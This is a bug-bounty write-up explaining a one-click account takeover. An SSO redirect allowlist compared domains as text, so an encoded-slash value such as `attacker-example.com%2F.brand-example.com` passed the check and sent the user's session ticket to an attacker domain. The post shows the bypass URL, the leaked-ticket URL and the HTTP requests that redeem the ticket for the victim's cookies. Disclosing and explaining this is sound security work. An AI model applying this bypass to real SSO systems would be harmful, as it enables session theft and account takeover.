---
title:       "One-click account takeover: the SSO open redirect handed over the session ticket"
summary:     "An SSO `host` parameter accepted foreign domains if you stuck a slash in the right place. What went to the attacker's domain was not the user — it was their session ticket. One click and the account changes hands."
date:        2026-10-18 12:05:00 +0100
lang:        en
ref:         open-redirect-sso-ticket
image:       /assets/img/og/open-redirect-sso-ticket-en.png
permalink:   /en/writeups/open-redirect-sso-session-ticket/

severity:    high
cvss:        "8.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
cwe:         "CWE-601 · CWE-287"
vuln_class:  "Authentication"
target_type: "Web SSO"
platform:    "YesWeHack"
status:      "Fixed"
tags:        [open-redirect, sso, ato, session, cookies, allowlist-bypass]

takeaways:
  - "An open redirect on its own is worth little. An open redirect that carries a credential in the URL is worth an account."
  - "Comparing domains as text is the mistake: `attacker.com/.brand.com` **contains** `.brand.com` and has nothing to do with it."
  - "Before celebrating, check the parameter really is validated: if an invalid value is rejected and yours gets through, you found a bypass, not an open field."
  - "The ticket must be bound to the destination that requested it. If it works anywhere, anywhere can spend it."
---

Of everything I have published, this is the one that changed how I look at things the most.
It started out looking like the most boring bug in the catalogue — an open redirect, the
kind many programs do not even accept — and ended up being **a one-click account takeover**.

<div class="warn" markdown="1">
**Everything is anonymised.** Published with the program's permission and without
identifying the product: company, domains, cookie names and parameter names have been
changed. The mechanism and the chain are exact.
</div>

## The starting point

A **single sign-on** system: that vendor page you go through to get into any of their
services. You type the password once, the SSO sends you back to the application that asked
for it, and that application gives you a session.

To know where to send you back, the SSO accepts a URL parameter:

```
https://sso.example.tld/doLogin?host=app.example.tld
```

That parameter travels in the link, so it is written by whoever makes the link. And whoever makes the link can be anyone.

## First attempt: rejected — and that is good news

The first thing everyone tries is their own domain:

```
https://sso.example.tld/doLogin?host=attacker-example.com
```

Response: **rejected**, with an internal error code. The server does not swallow just
anything.

This is where a lot of people close the tab and leave. I do the
opposite: a **rejection** means there is a control, and a control is something you can
**study**. If it had accepted my domain straight away, it would be a trivial bug. The
rejection turns the question into a much better one: *what exact rule is it applying?*

And that question is the one that pays.

## How you break an allowlist that compares text

The most common way to validate a domain — and the most broken — is to ask *"does the text
end in `.brand.com`?"* or, worse, *"does it contain it?"*.

It sounds reasonable. It fails for a subtle reason: **a URL is not a string, it is a
structure**, and the browser splits it at places a text comparison ignores.

Look at these three parameter values and think about where the user ends up:

| Parameter value | What the check sees | Where the browser lands |
|---|---|---|
| `app.brand.com` | contains `.brand.com` ✅ | `app.brand.com` ✅ |
| `attacker.com/.brand.com` | contains `.brand.com` ✅ | **`attacker.com`** ⚠ |
| `attacker.com%2F.brand.com` | after decoding, same as above | **`attacker.com`** ⚠ |

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/02-anatomia-url-en.svg' | relative_url }}"
       alt="Diagram of a URL: the destination server is whatever comes before the first slash, the rest is the path; the text check looks at the whole string">
  <figcaption>The browser cuts at the first slash. The check looks at the whole string. That is the gap.</figcaption>
</figure>

The browser decides the destination using whatever comes **before the
first slash**. Everything after that is the path, the "inside" of that site. So
`attacker.com/.brand.com` is a page called `.brand.com` on the attacker's server.

But if the server only checks whether the text *contains* `.brand.com`… it contains it. It
passes the check. And it sends you to the attacker's house.

The `%2F` in the third example is a slash written in URL encoding. The server
**decodes** it before comparing and before building the redirect, so it ends up being a
real slash — but on the way it slips past validations that would have rejected a literal
one.

That was the key:

```
https://sso.example.tld/doLogin?host=attacker-example.com%2F.brand-example.com
```

Accepted. Redirect to the attacker's domain.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-al-atacante.png' | relative_url }}"
       alt="Top: the login request with the host parameter set to atk.example.com%2F. followed by the victim domain, redacted. Bottom: the server response, whose redirectUrl field points at atk.example.com and carries the au= ticket in the URL">
  <figcaption>Top, what I sent; bottom, what the server answered. The <code>redirectUrl</code> points at the attacker domain with the <code>au=</code> ticket attached. Two excerpts of the same exchange, with the host, the account and the victim domain covered.</figcaption>
</figure>

## And this is where it stops being an open redirect

A plain open redirect is small change: you send someone to a site they did not expect. It
is useful for phishing, and many programs do not even pay for it.

What turns this into something else is **what the redirect carries with it**.

On completing the hop, the SSO appended a **session ticket** to the URL: a single-use
string that the legitimate application redeems to obtain the user's cookies. And that
ticket went, whole, to the attacker's domain:

```
https://attacker-example.com/.brand-example.com?ticket=a1b2c3d4e5f6...
```

Imagine the building's doorman, instead of walking you to your flat,
hands **the key** to whoever quotes an address that looks like yours. It is not that he
sent you to the wrong place: he gave away the key on the way.

And since the attacker owns that server, they read the ticket in their own access log. They
do not even need the victim to do anything else.

## The one-click case

There is a detail that makes this much worse. If the victim **already has an open session**
— the normal case, because people do not log out — no login screen appears at all. The SSO
sees the cookies, accepts the identity and issues the ticket **straight away**.

The victim makes **one click** on a link whose visible domain is the real vendor's. They
type no password. They see nothing odd. And the ticket is already in the attacker's hands.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena-en.svg' | relative_url }}"
       alt="Diagram of the five steps: the victim opens the link, the SSO issues the ticket without asking for a password, the redirect carries it to the attacker's domain, who reads it in their log and redeems it from a clean session">
  <figcaption>Five steps and one action by the victim. What travels in the redirect is a credential.</figcaption>
</figure>

## Redeeming the ticket

From a completely clean session — no cookies at all, no password, another browser, another
machine — the attacker presents the stolen ticket at the normal authentication endpoint:

```http
GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
Host: api.example.tld
```

```http
HTTP/2 200 OK
set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
```

The server hands over **the victim's session cookies**. The ticket alone produced the
session.

## Proving impact without overreaching

Holding a cookie proves nothing on its own. You have to show **what it opens**. I used that
session for a single read, the user's own profile:

```http
GET /v3/users/info HTTP/2
Host: api.example.tld
sessionId: <the victim's>
```

It returned their personal data **in clear text**, including the full email address — while
the application's own interface shows it masked.

The app shows you `j***@gmail.com` because it considers the email
sensitive. The API returns it whole. That difference is the proof that what I am holding is
not "some session": it is **that person's identity**.

And I stopped there. No devices touched, nothing modified, nothing accessed beyond the test
account.

## A bonus: the cookie that cancelled the protection

Looking at the cookies set when the ticket is redeemed, I saw that one of them carried
**the same session id in clear** and, unlike the main one, **without the `HttpOnly` flag**.

If the **same** identifier also travels in a second cookie without that flag, the protection on the first one is worth nothing: any script reads it from the other. It is locking a door and leaving the window next to it open.

## Impact

<div class="impact" markdown="1">
**Impact.** Full account takeover from **a single click** by the victim, on a link whose
visible domain is the vendor's legitimate one. The attacker obtains the complete session:
unmasked personal data, email, user id and access to whatever else that session reaches. No
password, no second factor, and nothing for the victim to fill in.
</div>
